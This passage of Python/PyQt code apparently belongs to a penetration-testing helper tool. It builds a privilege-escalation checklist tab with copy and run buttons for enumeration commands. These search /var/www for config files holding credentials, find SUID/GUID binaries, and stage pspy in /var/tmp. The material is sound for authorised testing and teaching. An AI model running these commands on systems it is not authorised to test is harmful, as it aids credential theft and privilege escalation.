        # home_Scan1 copy button
        if hasattr(self, 'home_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.home_Scan1_Copy)
            self.home_Scan1_Copy.deleteLater()
        self.home_Scan1_Copy = QPushButton()
        self.home_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.home_Scan1_Copy.setFixedSize(QSize(20,20))
        self.home_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.home_Scan1.text()))
        self.home_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # home_Scan1 run button
        if hasattr(self, 'home_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.home_Scan1_Run)
            self.home_Scan1_Run.deleteLater()
        self.home_Scan1_Run = QPushButton()
        self.home_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.home_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.home_Scan1.text() + "; bash"
        self.home_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.home_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # home_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.home_Scan1_Copy)
        label_layout.addWidget(self.home_Scan1_Run)
        label_layout.addWidget(self.home_Scan1)
        self.tab3_container_layout.insertLayout(33, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_home_divider 1
        if hasattr(self, 'lpe_home_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_home_divider1)
            self.lpe_home_divider1.deleteLater()
        self.lpe_home_divider1 = QFrame()
        self.lpe_home_divider1.setFrameShape(QFrame.HLine)
        self.lpe_home_divider1.setLineWidth(3)
        self.lpe_home_divider1.setStyleSheet("color: #20C20E;")

        # lpe_home_divider2
        if hasattr(self, 'lpe_home_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_home_divider2)
            self.lpe_home_divider2.deleteLater()
        self.lpe_home_divider2 = QFrame()
        self.lpe_home_divider2.setFrameShape(QFrame.HLine)
        self.lpe_home_divider2.setLineWidth(3)
        self.lpe_home_divider2.setStyleSheet("color: #20C20E;")

        # lpe_home_spacer1
        if hasattr(self, 'lpe_home_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_home_spacer1)
            self.lpe_home_spacer1.deleteLater()
        self.lpe_home_spacer1 = QLabel()
        self.lpe_home_spacer1.setFixedWidth(40)
        self.lpe_home_spacer1.setFixedHeight(50)

        # lpe_home_spacer2
        if hasattr(self, 'lpe_home_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_home_spacer2)
            self.lpe_home_spacer2.deleteLater()
        self.lpe_home_spacer2 = QLabel()
        self.lpe_home_spacer2.setFixedWidth(40)
        self.lpe_home_spacer2.setFixedHeight(50)

        # lpe_home_spacer & divider layout
        self.tab3_container_layout.insertWidget(34, self.lpe_home_spacer1)
        self.tab3_container_layout.insertWidget(35, self.lpe_home_divider1)
        self.tab3_container_layout.insertWidget(36, self.lpe_home_divider2)
        self.tab3_container_layout.insertWidget(37, self.lpe_home_spacer2)
        self.tab3_container_layout.addStretch()

# www
        if hasattr(self, 'www'):
            self.tab3_container_layout.removeWidget(self.www)
            self.www.deleteLater()
        self.www = QLabel("[+ Check */www for interesting files/directories: Web Configs Containing credentials?]")
        self.www.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(38,self.www)

        # www_Scan1
        if hasattr(self, 'www_Scan1'):
            self.tab3_container_layout.removeWidget(self.www_Scan1)
            self.www_Scan1.deleteLater()
        self.www_Scan1 = QLabel("ls -lsaht /var/www")
        self.www_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # www_Scan1 copy button
        if hasattr(self, 'www_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.www_Scan1_Copy)
            self.www_Scan1_Copy.deleteLater()
        self.www_Scan1_Copy = QPushButton()
        self.www_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.www_Scan1_Copy.setFixedSize(QSize(20,20))
        self.www_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.www_Scan1.text()))
        self.www_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # www_Scan1 run button
        if hasattr(self, 'www_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.www_Scan1_Run)
            self.www_Scan1_Run.deleteLater()
        self.www_Scan1_Run = QPushButton()
        self.www_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.www_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.www_Scan1.text() + "; bash"
        self.www_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.www_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # www_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.www_Scan1_Copy)
        label_layout.addWidget(self.www_Scan1_Run)
        label_layout.addWidget(self.www_Scan1)
        self.tab3_container_layout.insertLayout(39, label_layout)
        self.tab3_container_layout.addStretch()

        # www_Scan2
        if hasattr(self, 'www_Scan2'):
            self.tab3_container_layout.removeWidget(self.www_Scan2)
            self.www_Scan2.deleteLater()
        self.www_Scan2 = QLabel("find /var/www/ -name *config.php")
        self.www_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # www_Scan2 copy button
        if hasattr(self, 'www_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.www_Scan2_Copy)
            self.www_Scan2_Copy.deleteLater()
        self.www_Scan2_Copy = QPushButton()
        self.www_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.www_Scan2_Copy.setFixedSize(QSize(20,20))
        self.www_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.www_Scan2.text()))
        self.www_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # www_Scan2 run button
        if hasattr(self, 'www_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.www_Scan2_Run)
            self.www_Scan2_Run.deleteLater()
        self.www_Scan2_Run = QPushButton()
        self.www_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.www_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.www_Scan2.text() + "; bash"
        self.www_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.www_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # www_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.www_Scan2_Copy)
        label_layout.addWidget(self.www_Scan2_Run)
        label_layout.addWidget(self.www_Scan2)
        self.tab3_container_layout.insertLayout(40, label_layout)
        self.tab3_container_layout.addStretch()

	# lpe_www1_spacer1
        if hasattr(self, 'lpe_www1_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_www1_spacer1)
            self.lpe_www1_spacer1.deleteLater()
        self.lpe_www1_spacer1 = QLabel()
        self.lpe_www1_spacer1.setFixedWidth(40)
        self.lpe_www1_spacer1.setFixedHeight(50)

        # lpe_www1_spacer & divider layout
        self.tab3_container_layout.insertWidget(41, self.lpe_www1_spacer1)
        self.tab3_container_layout.addStretch()

# html
        if hasattr(self, 'html'):
            self.tab3_container_layout.removeWidget(self.html)
            self.html.deleteLater()
        self.html = QLabel("[+ Check */www/html for interesting files/directories: Web Configs containing credentials]")
        self.html.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(42,self.html)

        # html_Scan1
        if hasattr(self, 'html_Scan1'):
            self.tab3_container_layout.removeWidget(self.html_Scan1)
            self.html_Scan1.deleteLater()
        self.html_Scan1 = QLabel("ls -lsaht /var/www/html")
        self.html_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # html_Scan1 copy button
        if hasattr(self, 'html_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.html_Scan1_Copy)
            self.html_Scan1_Copy.deleteLater()
        self.html_Scan1_Copy = QPushButton()
        self.html_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.html_Scan1_Copy.setFixedSize(QSize(20,20))
        self.html_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.html_Scan1.text()))
        self.html_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # html_Scan1 run button
        if hasattr(self, 'html_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.html_Scan1_Run)
            self.html_Scan1_Run.deleteLater()
        self.html_Scan1_Run = QPushButton()
        self.html_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.html_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.html_Scan1.text() + "; bash"
        self.html_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.html_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # html_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.html_Scan1_Copy)
        label_layout.addWidget(self.html_Scan1_Run)
        label_layout.addWidget(self.html_Scan1)
        self.tab3_container_layout.insertLayout(43, label_layout)
        self.tab3_container_layout.addStretch()

        # html_Scan2
        if hasattr(self, 'html_Scan2'):
            self.tab3_container_layout.removeWidget(self.html_Scan2)
            self.html_Scan2.deleteLater()
        self.html_Scan2 = QLabel("find /var/www/html -name *config.php")
        self.html_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # html_Scan2 copy button
        if hasattr(self, 'html_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.html_Scan2_Copy)
            self.html_Scan2_Copy.deleteLater()
        self.html_Scan2_Copy = QPushButton()
        self.html_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.html_Scan2_Copy.setFixedSize(QSize(20,20))
        self.html_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.html_Scan2.text()))
        self.html_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # html_Scan2 run button
        if hasattr(self, 'html_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.html_Scan2_Run)
            self.html_Scan2_Run.deleteLater()
        self.html_Scan2_Run = QPushButton()
        self.html_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.html_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.html_Scan2.text() + "; bash"
        self.html_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.html_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # html_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.html_Scan2_Copy)
        label_layout.addWidget(self.html_Scan2_Run)
        label_layout.addWidget(self.html_Scan2)
        self.tab3_container_layout.insertLayout(44, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_html_divider 1
        if hasattr(self, 'lpe_html_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_html_divider1)
            self.lpe_html_divider1.deleteLater()
        self.lpe_html_divider1 = QFrame()
        self.lpe_html_divider1.setFrameShape(QFrame.HLine)
        self.lpe_html_divider1.setLineWidth(3)
        self.lpe_html_divider1.setStyleSheet("color: #20C20E;")

        # lpe_html_divider2
        if hasattr(self, 'lpe_html_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_html_divider2)
            self.lpe_html_divider2.deleteLater()
        self.lpe_html_divider2 = QFrame()
        self.lpe_html_divider2.setFrameShape(QFrame.HLine)
        self.lpe_html_divider2.setLineWidth(3)
        self.lpe_html_divider2.setStyleSheet("color: #20C20E;")

        # lpe_html_spacer1
        if hasattr(self, 'lpe_html_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_html_spacer1)
            self.lpe_html_spacer1.deleteLater()
        self.lpe_html_spacer1 = QLabel()
        self.lpe_html_spacer1.setFixedWidth(40)
        self.lpe_html_spacer1.setFixedHeight(50)

        # lpe_html_spacer2
        if hasattr(self, 'lpe_html_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_html_spacer2)
            self.lpe_html_spacer2.deleteLater()
        self.lpe_html_spacer2 = QLabel()
        self.lpe_html_spacer2.setFixedWidth(40)
        self.lpe_html_spacer2.setFixedHeight(50)

        # lpe_html_spacer & divider layout
        self.tab3_container_layout.insertWidget(45, self.lpe_html_spacer1)
        self.tab3_container_layout.insertWidget(46, self.lpe_html_divider1)
        self.tab3_container_layout.insertWidget(47, self.lpe_html_divider2)
        self.tab3_container_layout.insertWidget(48, self.lpe_html_spacer2)
        self.tab3_container_layout.addStretch()

# suid
        if hasattr(self, 'suid'):
            self.tab3_container_layout.removeWidget(self.suid)
            self.suid.deleteLater()
        self.suid = QLabel("[+ SUID Binaries?]")
        self.suid.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(49,self.suid)

        # suid_Scan1
        if hasattr(self, 'suid_Scan1'):
            self.tab3_container_layout.removeWidget(self.suid_Scan1)
            self.suid_Scan1.deleteLater()
        self.suid_Scan1 = QLabel("find / -perm -u=s -type f 2>/dev/null")
        self.suid_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # suid_Scan1 copy button
        if hasattr(self, 'suid_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.suid_Scan1_Copy)
            self.suid_Scan1_Copy.deleteLater()
        self.suid_Scan1_Copy = QPushButton()
        self.suid_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.suid_Scan1_Copy.setFixedSize(QSize(20,20))
        self.suid_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.suid_Scan1.text()))
        self.suid_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # suid_Scan1 run button
        if hasattr(self, 'suid_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.suid_Scan1_Run)
            self.suid_Scan1_Run.deleteLater()
        self.suid_Scan1_Run = QPushButton()
        self.suid_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.suid_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.suid_Scan1.text() + "; bash"
        self.suid_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.suid_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # suid_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.suid_Scan1_Copy)
        label_layout.addWidget(self.suid_Scan1_Run)
        label_layout.addWidget(self.suid_Scan1)
        self.tab3_container_layout.insertLayout(50, label_layout)
        self.tab3_container_layout.addStretch()

# lpe_suid1_spacer1
        if hasattr(self, 'lpe_suid1_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_suid1_spacer1)
            self.lpe_suid1_spacer1.deleteLater()
        self.lpe_suid1_spacer1 = QLabel()
        self.lpe_suid1_spacer1.setFixedWidth(40)
        self.lpe_suid1_spacer1.setFixedHeight(50)

        # lpe_suid1_spacer & divider layout
        self.tab3_container_layout.insertWidget(51, self.lpe_suid1_spacer1)
        self.tab3_container_layout.addStretch()

# guid
        if hasattr(self, 'guid'):
            self.tab3_container_layout.removeWidget(self.guid)
            self.guid.deleteLater()
        self.guid = QLabel("[+ GUID Binaries?]")
        self.guid.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(52,self.guid)

        # guid_Scan1
        if hasattr(self, 'guid_Scan1'):
            self.tab3_container_layout.removeWidget(self.guid_Scan1)
            self.guid_Scan1.deleteLater()
        self.guid_Scan1 = QLabel("find / -perm -g=s -type f 2>/dev/null")
        self.guid_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # guid_Scan1 copy button
        if hasattr(self, 'guid_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.guid_Scan1_Copy)
            self.guid_Scan1_Copy.deleteLater()
        self.guid_Scan1_Copy = QPushButton()
        self.guid_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.guid_Scan1_Copy.setFixedSize(QSize(20,20))
        self.guid_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.guid_Scan1.text()))
        self.guid_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # guid_Scan1 run button
        if hasattr(self, 'guid_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.guid_Scan1_Run)
            self.guid_Scan1_Run.deleteLater()
        self.guid_Scan1_Run = QPushButton()
        self.guid_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.guid_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.guid_Scan1.text() + "; bash"
        self.guid_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.guid_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # guid_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.guid_Scan1_Copy)
        label_layout.addWidget(self.guid_Scan1_Run)
        label_layout.addWidget(self.guid_Scan1)
        self.tab3_container_layout.insertLayout(53, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_suid_divider 1
        if hasattr(self, 'lpe_suid_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_suid_divider1)
            self.lpe_suid_divider1.deleteLater()
        self.lpe_suid_divider1 = QFrame()
        self.lpe_suid_divider1.setFrameShape(QFrame.HLine)
        self.lpe_suid_divider1.setLineWidth(3)
        self.lpe_suid_divider1.setStyleSheet("color: #20C20E;")

        # lpe_suid_divider2
        if hasattr(self, 'lpe_suid_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_suid_divider2)
            self.lpe_suid_divider2.deleteLater()
        self.lpe_suid_divider2 = QFrame()
        self.lpe_suid_divider2.setFrameShape(QFrame.HLine)
        self.lpe_suid_divider2.setLineWidth(3)
        self.lpe_suid_divider2.setStyleSheet("color: #20C20E;")

        # lpe_suid_spacer1
        if hasattr(self, 'lpe_suid_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_suid_spacer1)
            self.lpe_suid_spacer1.deleteLater()
        self.lpe_suid_spacer1 = QLabel()
        self.lpe_suid_spacer1.setFixedWidth(40)
        self.lpe_suid_spacer1.setFixedHeight(50)

        # lpe_suid_spacer2
        if hasattr(self, 'lpe_suid_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_suid_spacer2)
            self.lpe_suid_spacer2.deleteLater()
        self.lpe_suid_spacer2 = QLabel()
        self.lpe_suid_spacer2.setFixedWidth(40)
        self.lpe_suid_spacer2.setFixedHeight(50)

        # lpe_suid_spacer & divider layout
        self.tab3_container_layout.insertWidget(54, self.lpe_suid_spacer1)
        self.tab3_container_layout.insertWidget(55, self.lpe_suid_divider1)
        self.tab3_container_layout.insertWidget(56, self.lpe_suid_divider2)
        self.tab3_container_layout.insertWidget(57, self.lpe_suid_spacer2)
        self.tab3_container_layout.addStretch()

# pspy
        if hasattr(self, 'pspy'):
            self.tab3_container_layout.removeWidget(self.pspy)
            self.pspy.deleteLater()
        self.pspy = QLabel("[+ Using pspy on system]")
        self.pspy.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(58,self.pspy)

        # pspy_Scan1
        if hasattr(self, 'pspy_Scan1'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan1)
            self.pspy_Scan1.deleteLater()
        self.pspy_Scan1 = QLabel(f"cd /var/tmp")
        self.pspy_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # pspy_Scan1 copy button
        if hasattr(self, 'pspy_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan1_Copy)
            self.pspy_Scan1_Copy.deleteLater()
        self.pspy_Scan1_Copy = QPushButton()
        self.pspy_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.pspy_Scan1_Copy.setFixedSize(QSize(20,20))
        self.pspy_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.pspy_Scan1.text()))
        self.pspy_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan1 run button
        if hasattr(self, 'pspy_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan1_Run)
            self.pspy_Scan1_Run.deleteLater()
        self.pspy_Scan1_Run = QPushButton()
        self.pspy_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.pspy_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.pspy_Scan1.text() + "; bash"
        self.pspy_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.pspy_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.pspy_Scan1_Copy)
        label_layout.addWidget(self.pspy_Scan1_Run)
        label_layout.addWidget(self.pspy_Scan1)
        self.tab3_container_layout.insertLayout(59, label_layout)
        self.tab3_container_layout.addStretch()

        # pspy_Scan2
        if hasattr(self, 'pspy_Scan2'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan2)
            self.pspy_Scan2.deleteLater()
        self.pspy_Scan2 = QLabel(f"transfer pyspy32 or 64 over to /var/tmp")
        self.pspy_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # pspy_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.pspy_Scan2)
        self.tab3_container_layout.insertLayout(60, label_layout)
        self.tab3_container_layout.addStretch()

        # pspy_Scan2
        if hasattr(self, 'pspy_Scan2'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan2)
            self.pspy_Scan2.deleteLater()
        self.pspy_Scan2 = QLabel("./pspy32")
        self.pspy_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # pspy_Scan2 copy button
        if hasattr(self, 'pspy_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan2_Copy)
            self.pspy_Scan2_Copy.deleteLater()
        self.pspy_Scan2_Copy = QPushButton()
        self.pspy_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.pspy_Scan2_Copy.setFixedSize(QSize(20,20))
        self.pspy_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.pspy_Scan2.text()))
        self.pspy_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan2 run button
        if hasattr(self, 'pspy_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan2_Run)
            self.pspy_Scan2_Run.deleteLater()
        self.pspy_Scan2_Run = QPushButton()
        self.pspy_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.pspy_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.pspy_Scan2.text() + "; bash"
        self.pspy_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.pspy_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.pspy_Scan2_Copy)
        label_layout.addWidget(self.pspy_Scan2_Run)
        label_layout.addWidget(self.pspy_Scan2)
        self.tab3_container_layout.insertLayout(61, label_layout)
        self.tab3_container_layout.addStretch()

        # pspy_Scan3
        if hasattr(self, 'pspy_Scan3'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan3)
            self.pspy_Scan3.deleteLater()
        self.pspy_Scan3 = QLabel("./pspy32")
        self.pspy_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # pspy_Scan3 copy button
        if hasattr(self, 'pspy_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan3_Copy)
            self.pspy_Scan3_Copy.deleteLater()
        self.pspy_Scan3_Copy = QPushButton()
        self.pspy_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.pspy_Scan3_Copy.setFixedSize(QSize(20,20))
        self.pspy_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.pspy_Scan3.text()))
        self.pspy_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan3 run button
        if hasattr(self, 'pspy_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan3_Run)
            self.pspy_Scan3_Run.deleteLater()
        self.pspy_Scan3_Run = QPushButton()
        self.pspy_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.pspy_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.pspy_Scan3.text() + "; bash"
        self.pspy_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.pspy_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.pspy_Scan3_Copy)
        label_layout.addWidget(self.pspy_Scan3_Run)
        label_layout.addWidget(self.pspy_Scan3)
        self.tab3_container_layout.insertLayout(62, label_layout)
        self.tab3_container_layout.addStretch()

        # pspy_Scan4
        if hasattr(self, 'pspy_Scan4'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan4)
            self.pspy_Scan4.deleteLater()
        self.pspy_Scan4 = QLabel("./pspy64")
        self.pspy_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # pspy_Scan4 copy button
        if hasattr(self, 'pspy_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan4_Copy)
            self.pspy_Scan4_Copy.deleteLater()
        self.pspy_Scan4_Copy = QPushButton()
        self.pspy_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.pspy_Scan4_Copy.setFixedSize(QSize(20,20))
        self.pspy_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.pspy_Scan4.text()))
        self.pspy_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan4 run button
        if hasattr(self, 'pspy_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.pspy_Scan4_Run)
            self.pspy_Scan4_Run.deleteLater()
        self.pspy_Scan4_Run = QPushButton()
        self.pspy_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.pspy_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.pspy_Scan4.text() + "; bash"
        self.pspy_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.pspy_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # pspy_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.pspy_Scan4_Copy)
        label_layout.addWidget(self.pspy_Scan4_Run)
        label_layout.addWidget(self.pspy_Scan4)
        self.tab3_container_layout.insertLayout(63, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_pspy_divider 1
        if hasattr(self, 'lpe_pspy_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_pspy_divider1)
            self.lpe_pspy_divider1.deleteLater()
        self.lpe_pspy_divider1 = QFrame()
        self.lpe_pspy_divider1.setFrameShape(QFrame.HLine)
        self.lpe_pspy_divider1.setLineWidth(3)
        self.lpe_pspy_divider1.setStyleSheet("color: #20C20E;")

        # lpe_pspy_divider2
        if hasattr(self, 'lpe_pspy_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_pspy_divider2)
            self.lpe_pspy_divider2.deleteLater()
        self.lpe_pspy_divider2 = QFrame()
        self.lpe_pspy_divider2.setFrameShape(QFrame.HLine)
        self.lpe_pspy_divider2.setLineWidth(3)
        self.lpe_pspy_divider2.setStyleSheet("color: #20C20E;")

        # lpe_pspy_spacer1
        if hasattr(self, 'lpe_pspy_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_pspy_spacer1)
            self.lpe_pspy_spacer1.deleteLater()
        self.lpe_pspy_spacer1 = QLabel()
        self.lpe_pspy_spacer1.setFixedWidth(40)
        self.lpe_pspy_spacer1.setFixedHeight(50)

        # lpe_pspy_spacer2
        if hasattr(self, 'lpe_pspy_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_pspy_spacer2)
            self.lpe_pspy_spacer2.deleteLater()
        self.lpe_pspy_spacer2 = QLabel()
        self.lpe_pspy_spacer2.setFixedWidth(40)
        self.lpe_pspy_spacer2.setFixedHeight(50)

        # lpe_pspy_spacer & divider layout
        self.tab3_container_layout.insertWidget(64, self.lpe_pspy_spacer1)
        self.tab3_container_layout.insertWidget(65, self.lpe_pspy_divider1)
